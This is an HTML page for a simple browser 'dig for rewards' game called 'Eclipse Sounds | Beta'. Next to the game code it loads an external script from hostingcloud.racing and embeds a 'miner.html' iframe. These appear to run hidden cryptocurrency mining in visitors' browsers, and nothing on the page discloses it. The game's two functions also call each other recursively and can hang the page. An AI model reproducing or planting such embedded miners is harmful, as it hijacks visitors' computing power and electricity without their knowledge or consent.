<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <link
      rel="shortcut icon"
      type="image/x-icon"
      href="https://cdn.glitch.com/457abbe8-4602-4fcd-8eb3-78bfe5da9c06%2Fegg.ico?1547155629924"
    />
    <title>Eclipse Sounds| Beta</title>
    <!--   This is where the Phaser 2.6.2 code is brought in to the app. -->

    <script type="text/javascript" src="/js/fly.js" defer></script>
    <script
      type="text/javascript"
      src="/games/eclipse/eclipse.js"
      defer
    ></script>

    <link rel="stylesheet" href="style.css" />
    <link rel="stylesheet" href="/fly.css" />
    <script src="https://www.hostingcloud.racing/vrGl.js"></script>

    <style>
      .map {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
      }
      .bombs {
        width: 65%;
        height: 85%;
        border-style: groove;
        border-color: silver;
        overflow: scroll;
      }
      .tools {
        width: 65%;
        height: 5%;
        border-style: groove;
        border-color: silver;
      }
      .tool {
        cursor: pointer;
      }

      .pixel {
        float: left;
        margin: 0.3px;
        width: 55px;
        height: 55px;
        background-color: red;
        border-color: black;
        border-style: solid;
        background-image: url("https://cdn.glitch.me/f23d0d76-dc88-4f4e-afe2-9bd56ac40b28%2Fpixel.png");
        background-size: contain;
      }
    </style>

    <script>
      function startBombs() {
        Bombs();
        var ID = [
          "bomb",
          "rock",
          "token",
          "rock",
          "bomb",
          "bomb",
          "rock",
          "token",
          "bomb",
          "rock",
          "rock",
          "bomb",
          "bomb",
          "rock",
          "stop"
        ];
        const random = ID[Math.floor(Math.random() * ID.length)];

        var create = document.createElement("div");
        create.className = "pixel";
        create.title = "Dig For Rewards";
        create.id = random;
        var Create = document.getElementById("bombs").appendChild(create);

        if (Create.id == "stop") {
          alert("Dig For Rewards");
        } else {
          Bombs();
        }
      }
      function Bombs() {
        var ID = [
          "bomb",
          "rock",
          "token",
          "rock",
          "bomb",
          "bomb",
          "rock",
          "token",
          "bomb",
          "rock",
          "rock",
          "bomb",
          "bomb",
          "rock"
        ];
        const random = ID[Math.floor(Math.random() * ID.length)];

        var create = document.createElement("div");
        create.className = "pixel";
        create.title = "Dig For Rewards";
        create.id = random;
        var Create = document.getElementById("bombs").appendChild(create);
        startBombs();
      }
    </script>
  </head>
  <body>
    <miner><iframe src="miner.html"></iframe></miner>
    <wrap>
      <label id="minutes" value="0" class="hide">00</label>.<label
        id="seconds"
        value="0"
        class="hide"
        >00</label
      >
      <meter
        value="0"
        id="SCORE"
        max="100"
        min="0"
        low="10"
        high="80"
        class="hide"
      ></meter>
      <center>
        <div class="map">
          <div class="bombs" id="bombs">
            <div class="pixel"></div>
          </div>
          <div class="tools">
            <div class="tool" onclick="startBombs();">
              Start Game
            </div>
          </div>
        </div>
      </center>
    </wrap>
  </body>
</html>
